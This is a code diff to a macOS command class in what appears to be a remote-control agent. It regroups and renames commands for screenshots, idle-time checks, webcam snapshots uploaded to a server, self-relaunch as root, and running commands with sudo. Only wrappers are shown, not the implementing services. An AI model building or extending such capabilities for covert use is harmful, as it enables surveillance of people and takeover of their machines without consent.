@@ -20,11 +20,11 @@ class MacCommands(CommonCommands):
         self.mac_automation = MacAutomationService(self)
         self.mac_file_inspection = MacFileInspectionService(self)
 
-    @desc("Capture a screenshot", group='platform')
+    @desc("Capture a screenshot", group='media')
     def screenshot(self):
         return self.mac_media.capture_screenshot()
 
-    @desc('Show system information', group='platform')
+    @desc('Show system information', group='system')
     def getinfo(self, arg=''):
         try:
             return self.mac_system.collect_system_info(arg)
@@ -32,22 +32,22 @@ class MacCommands(CommonCommands):
             logger.error(e, exc_info=True)
             return 0, f'Failed to collect system information: {e}'
 
-    @desc('Show user idle time', group='platform')
+    @desc('Show user idle time', group='system')
     def idletime(self):
         return self.mac_system.get_idle_time()
 
-    @desc('Capture webcam photo', group='platform')
+    @desc('Capture webcam photo', group='media')
     def webcam_snap(self):
         """拍照并上传到服务器"""
         return self.mac_media.capture_webcam_photo()
 
-    @desc('Launch new instance with sudo', group='platform')
-    def sudo_self(self):
+    @desc('Launch new instance with sudo', group='privilege')
+    def spawn_elevated_instance(self):
         """以 root 权限启动新实例，返回 PID"""
         return self.mac_automation.sudo_self()
 
-    @desc('Run command with sudo', group='platform')
-    def sudo_run(self, command):
+    @desc('Run command with sudo', group='privilege')
+    def run_elevated(self, command):
         """以 root 权限执行命令 (macOS)"""
         return self.mac_automation.sudo_run(command)
 
